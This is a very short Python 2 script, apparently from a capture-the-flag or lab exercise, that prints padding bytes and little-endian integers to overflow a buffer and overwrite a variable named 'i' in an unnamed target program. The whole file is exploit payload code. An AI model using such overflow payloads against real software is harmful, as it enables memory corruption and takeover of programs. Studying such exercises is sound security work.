# over write i
print "A"*12 + "\x0b\x00\x00\x00"
for i in range(1121):
    print "A"


print "A" * 12 + "\x09\x00\x00\x00"